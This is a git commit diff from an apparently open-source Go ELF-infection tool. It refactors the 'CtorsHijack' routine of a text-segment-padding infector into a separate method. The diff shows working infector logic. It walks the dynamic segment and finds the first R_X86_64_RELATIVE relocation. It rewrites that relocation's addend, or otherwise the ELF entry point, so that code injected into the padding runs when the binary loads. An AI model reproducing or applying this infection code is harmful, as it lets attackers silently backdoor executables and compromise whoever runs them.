4fb0a62293d18d200b672394436fa9632cb270f6
sad0p <sad0p@protonmail.com>
2022-10-07 09:55:16 -0400

    refactoring -- pulled code for relative-relocation hooking out to a method

--- elfinfect/text_segment_padding.go
+++ elfinfect/text_segment_padding.go
@@ -7,7 +7,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"errors"
-	"reflect"
 )
 
 const (
@@ -51,91 +50,10 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		var relocEntry elf.Rela64
 
 		if (opts & CtorsHijack) == CtorsHijack {
-			
-			if debug {
-				fmt.Println("[+] CtorsHijack requested. Locating and reading Dynamic Segment")
-		
-			}
-			
-			if err := t.GetDyn(); err != nil {
-				return err;
-			}
-			
-			if debug {
-				fmt.Printf("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn64)))
-			}
-			
-			var dtRelaOffset uint64
-			var dtRelaEntryCount uint64
-
-			for _, dynEntry := range t.Dyn.([]elf.Dyn64) {
-				if elf.DynTag(dynEntry.Tag) == elf.DT_RELA {
-					if debug {
-						fmt.Printf("[+] Located DT_RELA @ 0x%016x\n", dynEntry.Val)
-					}
-					dtRelaOffset = dynEntry.Val
-				}
-
-				if elf.DynTag(dynEntry.Tag) == elf.DT_RELAENT {
-					if debug {
-						fmt.Printf("[+] DT_RELA has %d entries\n", dynEntry.Val)
-					}
-					dtRelaEntryCount = dynEntry.Val
-				}
-			}
-
-			if dtRelaEntryCount == 0 || dtRelaOffset == 0 {
-				return errors.New("Error while acquiring DT_RELA or DT_RELAENT")
-			}
-			
-			var o uint64
-			if elf.Type(t.Hdr.(*elf.Header64).Type) == elf.ET_EXEC {
-				if err := getBaseAddrOfVaddr(dtRelaOffset, t.Phdrs.([]elf.Prog64), &o); err != nil {
-					return err
-				}
-			}else {
-				o = dtRelaOffset
-			}
-			
-			if debug{
-				fmt.Printf("[+] File offset of relocations @ 0x%016x\n", o)
-			}
-			
-			origRelocStart := o
-			
-			s := uint64(reflect.TypeOf(relocEntry).Size())		
-			endReloc := o + dtRelaEntryCount * uint64(s)
-			for o < endReloc {
-				relReader := bytes.NewBuffer(t.Contents[o : o + s])
-				if err := binary.Read(relReader, t.EIdent.Endianness, &relocEntry); err != nil {
-					return err
-				}
-				
-				if elf.R_X86_64(relocEntry.Info) == elf.R_X86_64_RELATIVE {
-					if debug {
-						fmt.Println("[+] Found first relative reloc")
-						fmt.Printf("\toffset: 0x%016x\n", relocEntry.Off) 
-						fmt.Printf("\ttype: %s\n", elf.R_X86_64_RELATIVE.String())
-						fmt.Printf("\tAddend: 0x%016x\n", relocEntry.Addend)
-					}
-					break
-				}
-				o += s
-			}
-
-			if elf.R_X86_64(relocEntry.Info) != elf.R_X86_64_RELATIVE {
-				return errors.New("No R_X86_64_RELATIVE relocation type present for this technique.")
-			}
-			
-			origAddend = relocEntry.Addend
-			relocEntry.Addend = int64(pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz) 
-			relWriter := new(bytes.Buffer)
-			if err := binary.Write(relWriter, t.EIdent.Endianness, &relocEntry); err != nil {
+			if err := t.relativeRelocHook(&origAddend, &relocEntry, debug); err != nil {
 				return err
 			}
-			copy(t.Contents[origRelocStart:], relWriter.Bytes())
 			
-
 		}else {
 			t.Hdr.(*elf.Header64).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
 		}
